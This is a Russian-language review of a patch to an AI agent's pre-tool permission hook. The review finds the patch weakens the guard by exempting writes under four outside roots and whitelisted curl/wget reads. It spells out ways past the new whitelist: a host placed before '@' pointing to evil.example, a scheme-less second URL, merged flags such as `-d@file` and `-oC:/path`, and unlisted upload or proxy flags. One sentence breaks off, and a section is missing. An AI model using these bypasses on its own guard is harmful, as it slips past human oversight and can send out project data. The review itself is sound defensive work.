## п.1. Копия правки и доказательство, что она восстанавливает файлы

Дифф — ниже, в разделе «Приложение», между строками `~~~~diff` и `~~~~`. Это вывод
`git --no-optional-locks diff HEAD --no-color --no-ext-diff --no-textconv -- pretool_guard.py test_pretool_guard.py`
без единой правки: **249 строк, 18 977 байт, sha256 `999ce9c6ae122244…`**. Мерить нужно извлечённый блок, а не весь файл.

| проверка | результат |
|---|---|
| база | `git show HEAD:<файл>` → `tmp/g65/base/` |
| наложение | `git apply --directory=tmp/g65/base tmp/g65/copy.diff` → exit **0** |
| `pretool_guard.py` | git-хеш восстановленного **`1e4ba1b060da436f211ad5d06198b60912372c80`** = живой рабочей копии |
| `test_pretool_guard.py` | git-хеш **`c2be563633dac7cfbd160d92270afdfe08b50eb0`** = живой; побайтно **равен** (`cmp`) |
| побайтная оговорка по гарду | живой `pretool_guard.py` записан с концами строк **LF** (CR 0 из 6002). `git apply` при `core.autocrlf=true` пишет **CRLF**, как любой checkout. Содержимое без CR совпадает побайтно, git-объект тот же, для Python и для git разницы нет. sha256 живых файлов для сверки: гард `726f2f6305a595b3…955c6059`, тест `43879a19f91e31f5…a91d1ddae59a4d47` |
| сверка вставки | блок, извлечённый рецептом ниже из этого файла ДО коммита, побайтно равен `tmp/g65/copy.diff` (`cmp` молчит, sha256 `999ce9c6ae122244…`). Та же сверка из закоммиченного объекта — в отчёте захода и строке журнала |

**Прямо: после коммита этого файла откат `pretool_guard.py` и `test_pretool_guard.py` к HEAD уничтожает
не единственную копию правки.** Восстановление — из корня репо, на дереве, где оба файла равны HEAD:


Оговорка: копия живёт в **локальной** истории. Push этим заходом не делался: запрет «наружу не

## п.3. Что правка меняет в поведении гарда

**Итог: гард СЛАБЕЕ. Новых ловушек ноль, снятых классов карточек два.** Единственная новая проверка —
«куда ложится скачанное» (`_RE_NET_OUT`, :825 и :866–872). Она живёт ВНУТРИ `_net_sanctioned` и
только сужает послабление. До правки любая такая команда и так была красной `network`, поэтому
строже гард нигде не стал.

### А. Запись инструментом вне репо (`write_outside`) — перестаёт спрашивать в четырёх корнях

- :1893 `_TRUSTED_ROOTS = ("D:/turbobaby-bike-bot", "D:/t27-apex", "D:/t27work", "D:/tmp")`; :1897–1908 `_is_trusted_root`; :1911–1917 — корни добавлены в `_sanctioned_outside`.
- Работает через :3577 `if not _inside_project(path) and not _sanctioned_outside(path): return ("ask","write_outside",…)`. Write/Edit/NotebookEdit любого файла под этими корнями — теперь `defer`.
- **Остаётся красным**, потому что стоит выше в `_decide_write`: секретный путь (:3553 `edit_secret`), конфиг `.claude` (:3555 `edit_claude`), значение секрета в теле записи (:3565–3571 `env`).
- **Не затронуто.** `_sanctioned_outside` вызывается ровно в двух местах: :871 и :3577. Запись шеллом `> D:/tmp/x` судит ветка `outside` через `_inside_project` (:3760–3762) — карточка остаётся. Удаление судит свой разбор (:3769–3772) — тоже.
- **Что становится зелёным без карточки** (вывод по коду): `.git/hooks/*` и `.github/workflows/*` в чужом репо `D:/turbobaby-bike-bot`. Это код, который исполнится при следующей git-операции или на CI. Путь сравнивается по `normpath`, а не `realpath` (:1905), поэтому junction внутри `D:/tmp` ведёт куда угодно. Тот же класс уже есть у `_inside_project` (:1657–1665), но там корень — сам репо.

### Б. Сеть (`network`) — перестаёт спрашивать на «чтении по белому списку»

- :3705 `if kind == "network" and (netk != "open" or _net_sanctioned(cmd, cwd)): continue`. **Это единственная строка, которая снимает карточку.**
- `_net_sanctioned` (:830–873) возвращает True, если в каждом сегменте с сетевым инструментом одновременно: инструмент из `curl, wget, iwr, irm, invoke-webrequest, invoke-restmethod` (:813, :857); нет признака отправки `_RE_NET_SEND` (:816–819, :859); все хосты из `https?://` входят в список api.github.com, raw.githubusercontent.com, github.com, objects.githubusercontent.com, codeload.github.com, t27.ai (:814–815, :861–863); нет `-O` (:826, :864–865); `-o` ведёт в репо или в разрешённые зоны, включая четыре корня из п.А (:825, :866–872). Значение секрета в тексте команды отменяет послабление целиком (:840).
- **Остаётся красным:** ssh/scp/nc/telnet (:857–858), чужой хост, адрес из переменной, отправка тела разнесённым флагом, `-O`, `-o` вне зон. Все прочие красные ветви команды (`env`, `outside`, `delete`…) не заслонены: там `continue`, а не `return`.
- :3804–3805 `if _net_sanctioned(cmd, cwd): return ("defer","net_read",…)`. **В живом хуке эта строка решения не меняет, только имя в журнале.** Хук зовёт `decide_for_role` (:5982), а там `unknown` не красный: `_stays_red` → False (:4673), и итог — `defer` (:4701). Комментарий правки на :3797–3801 («жать её пришлось бы по-прежнему») верен для голого `decide()`, но не для хука.

## п.4. Безопасно ли принять правку по её содержанию, и чего проверка не видит

**Прямой ответ: принять можно как узаконивание уже действующего, но «безопасной» в заявленных ею
же границах назвать нельзя.** Правка аккуратна: разбор fail-closed, четыре замка, тесты с обеих
сторон границы, 441/441 зелёные. Но её обещание — «только ЧТЕНИЕ по белому списку, скачанное
только в разрешённые зоны» — по чтению регулярок проходимо. До правки каждая форма ниже давала
`ask network`, после — `defer`, если других красных признаков в команде нет:

1. **Хост до `@`.** `_RE_NET_URL = \bhttps?://([A-Za-z0-9._\-]+)` (:820) обрывает хост на `@` и `:`. `https://api.github.com@evil.example/` засчитывается как api.github.com, а соединение идёт на evil.example.
2. **Второй адрес без схемы.** Хосты берутся только из `https?://`. В `curl -s https://api.github.com/x evil.example/y` второй адрес не виден, а curl ходит по обоим.
3. **Слитные короткие флаги.** `_RE_NET_SEND` и `_RE_NET_OUT` требуют после флага `=`, пробел или конец (:818, :825). Не видны `-d@файл`, `-Tфайл`, `-Fa=@файл` (отправка тела) и `-oC:/путь` (скачанное ложится куда угодно, в том числе в автозагрузку).
4. **Флаги вне перечня.** wget `--post-file`, `--post-data`, `--body-file`, `--method=POST`, `-P`/`--directory-prefix`, `-e`; curl `-K`/`--config`, `--resolve`, `--connect-to`, `-x`/`--proxy`; двоеточие PowerShell: `-Method:Post`, `-InFile:x`, `-OutFile:C:\x`.

Смягчает: значения секретов и обращения к `.env` ловятся своими ветвями раньше (:840, :3748).
Поэтому `-d@.env` спрашивает и после правки. Вынос обычного файла проекта или запись скачанного
вне зон — нет.

**Чего проверка не видит:**
- Формы 1–4 **не замерены**: пробных запусков `decide()` не было (запрет). Это вывод по коду, и на него нет ни одного теста: 13 тестов правки проверяют только разнесённые формы флагов.
- Автора и «решения владельца», на которое ссылаются комментарии (:795–811, :1881–1892). Замер «4000 решений» в них не проверялся, запись о решении в мозге не искалась.
- Внешний второй слой защиты поверх гарда. Ловит ли он сеть сам, неизвестно: в репо его нет.
- Исход гейта самообновления на чистом дереве (П3) и зеркало этой правки на серверной полосе.
- Запись в чужие репо (п.А) судится только гардом этой полосы. Что исполнится в `D:/turbobaby-bike-bot` из записанного, не оценивалось.
